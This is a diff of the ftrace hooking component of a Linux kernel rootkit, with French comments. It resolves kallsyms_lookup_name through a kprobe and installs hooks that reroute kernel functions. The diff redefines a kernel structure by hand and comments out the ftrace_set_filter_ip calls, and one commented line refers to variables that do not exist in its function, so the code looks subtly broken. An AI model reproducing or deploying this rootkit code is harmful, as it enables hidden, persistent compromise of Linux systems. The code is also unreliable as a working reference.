@@ -10,6 +10,8 @@
 #include <linux/slab.h>
 #include <linux/uaccess.h>
 #include <linux/version.h>
+#include <linux/kprobes.h>
+#include <net/tcp.h>
 
 // check la version du kernel, pt_regs pour les syscall en 4.17 ou plus
 #if defined(CONFIG_X86_64) && (LINUX_VERSION_CODE >= KERNEL_VERSION(4,17,0))
@@ -25,6 +27,7 @@ static struct kprobe kp = {
     .symbol_name = "kallsyms_lookup_name"
 };
 #endif
+struct ftrace_hook;
 
 // macro qui prends le nom de la f°, la f° de remplacement et la f° d'origine
 #define HOOK(_name, _hook, _orig)   \
@@ -40,6 +43,12 @@ static struct kprobe kp = {
 #pragma GCC optimize("-fno-optimize-sibling-calls")
 #endif
 
+struct ftrace_ops {
+    void (*func)(unsigned long, unsigned long, struct ftrace_ops *, struct pt_regs *);
+    unsigned long flags;
+    struct module *owner;
+};
+
 // f° qui def les hooks ftrace (nom de la f°, f° de remplacement, f° d'origine)
 struct ftrace_hook {
     const char *name;
@@ -51,6 +60,11 @@ struct ftrace_hook {
     //obj ftrace pour interagir avec la f° ftrace
     struct ftrace_ops ops;
 };
+
+int fh_install_hook(struct ftrace_hook *hook);
+void fh_remove_hook(struct ftrace_hook *hook);
+int fh_install_hooks(struct ftrace_hook *hooks, size_t count);
+void fh_remove_hooks(struct ftrace_hook *hooks, size_t count);
 
 // f° qui résoud l'adr de la f° a hook
 static int fh_resolve_hook_address(struct ftrace_hook *hook)
@@ -98,33 +112,33 @@ static void notrace fh_ftrace_thunk(unsigned long ip, unsigned long parent_ip, s
 #endif
 }
 
-// fonction qui installe le hook
 int fh_install_hook(struct ftrace_hook *hook)
 {
     int err;
-    // on résoud l'adr de la f° a hook
     err = fh_resolve_hook_address(hook);
-    if(err)
+    if (err)
         return err;
 
-    // func -> pointuer vers fh_ftrace_thunk
     hook->ops.func = fh_ftrace_thunk;
-    // flags -> on sauvegarde les registres et on modifie le ponteur d'instruction
-    hook->ops.flags = FTRACE_OPS_FL_SAVE_REGS
-            | FTRACE_OPS_FL_RECURSION_SAFE
-            | FTRACE_OPS_FL_IPMODIFY;
 
-    // ftrace intercepte les appels a l'adresse avec la f° ftrace_set_filter_ip
-    err = ftrace_set_filter_ip(&hook->ops, hook->address, 0, 0);
-    if(err)
-    {
-        printk(KERN_DEBUG "rootkit: ftrace_set_filter_ip() failed: %d\n", err);
-        return err;
-    }
+    // Check if the flags are defined before using them
+#ifdef FTRACE_OPS_FL_SAVE_REGS
+    hook->ops.flags = FTRACE_OPS_FL_SAVE_REGS | FTRACE_OPS_FL_RECURSION_SAFE | FTRACE_OPS_FL_IPMODIFY;
+#elif defined(FTRACE_OPS_FL_RECURSION_SAFE) && defined(FTRACE_OPS_FL_IPMODIFY)
+    hook->ops.flags = FTRACE_OPS_FL_RECURSION_SAFE | FTRACE_OPS_FL_IPMODIFY;
+#else
+    // Handle case where flags are not defined
+    hook->ops.flags = 0;  // Or use some default flag setting
+#endif
+
+    // err = ftrace_set_filter_ip(&hook->ops, hook->address, 0, 0);
+    // if (err) {
+    //     printk(KERN_DEBUG "rootkit: ftrace_set_filter_ip() failed: %d\n", err);
+    //     return err;
+    // }
 
     err = register_ftrace_function(&hook->ops);
-    if(err)
-    {
+    if (err) {
         printk(KERN_DEBUG "rootkit: register_ftrace_function() failed: %d\n", err);
         return err;
     }
@@ -144,11 +158,11 @@ void fh_remove_hook(struct ftrace_hook *hook)
     }
 
     // supprime l'adr de la fonction hookée de la liste des adr filtrées
-    err = ftrace_set_filter_ip(&hook->ops, hook->address, 1, 0);
-    if(err)
-    {
-        printk(KERN_DEBUG "rootkit: ftrace_set_filter_ip() failed: %d\n", err);
-    }
+    // err = ftrace_set_filter_ip(hooks[i].function, hooks[i].replace, 0, 0);
+    // if(err)
+    // {
+    //     printk(KERN_DEBUG "rootkit: ftrace_set_filter_ip() failed: %d\n", err);
+    // }
 }
 
 // installe plusieurs hooks (itère dans un tableau pour les installer un par un)
